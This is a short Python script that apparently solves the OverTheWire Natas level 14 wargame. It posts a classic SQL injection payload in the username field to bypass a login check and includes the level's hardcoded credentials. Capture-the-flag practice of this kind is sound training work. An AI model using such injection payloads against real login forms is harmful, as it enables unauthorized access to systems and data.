#!/usr/bin/env python

import requests
import re

username = 'natas14'
password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'

url = f'http://{username}.natas.labs.overthewire.org/?debug=true'


session = requests.Session()
# response = session.get(url + 'index-source.html', auth=(username, password))
response = session.post(url, data={
                        "username": 'please" OR 1=1 #', "password": "subscribe"}, auth=(username, password))


content = response.text
output = open('output.html', 'w')
output.write(content)

print(content)

